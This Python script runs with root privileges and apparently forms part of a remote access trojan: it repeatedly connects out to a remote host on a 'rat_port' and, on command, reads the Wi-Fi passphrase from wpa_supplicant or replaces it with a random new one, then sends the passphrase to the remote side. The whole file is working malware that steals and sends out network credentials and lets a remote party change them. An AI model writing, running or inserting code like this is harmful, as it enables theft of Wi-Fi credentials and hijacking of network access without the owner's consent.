#!/usr/bin/sudo /usr/bin/python3

from random import choice
import socket
from time import sleep

from constants import *


def generate_password():
	new_password = '' # noqa
	for x in range(PASSWORD_LENGTH):
		new_password += choice(printable)
	print(new_password)
	return new_password


def set_password(new_password): # noqa
	with open(wpa_supplicant) as f:
		lines = f.readlines()
		for i, line in enumerate(lines):
			if 'psk=' not in line:
				continue
			line = line[:line.index('psk=') + 4] + f'"{new_password}"\n'
			line_num = i
			break

	lines[line_num] = line
	print(line)

	with open(wpa_supplicant, 'w') as f:
		f.writelines(lines)


def get_password():
	with open(wpa_supplicant) as f:
		lines = f.readlines()
		for i, line in enumerate(lines):
			line = line.strip('\n ')
			if 'psk=' not in line:
				continue
			password = line[line.index('psk=') + 5:][:-1]
			return password



s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # noqa

print("[*] Waiting for the client...")

while True:
	try:
		s.connect((host, rat_port))
		break
	except socket.error:
		sleep(0.1)

print(f"[*] Connection is established successfully")
mode = s.recv(MAX_PASSWORD_BYTES).decode()

if mode == 'change':
	new_password = generate_password()
	set_password(new_password)
elif mode == 'get':
	new_password = get_password()

s.send(new_password.encode()) # noqa

s.close()
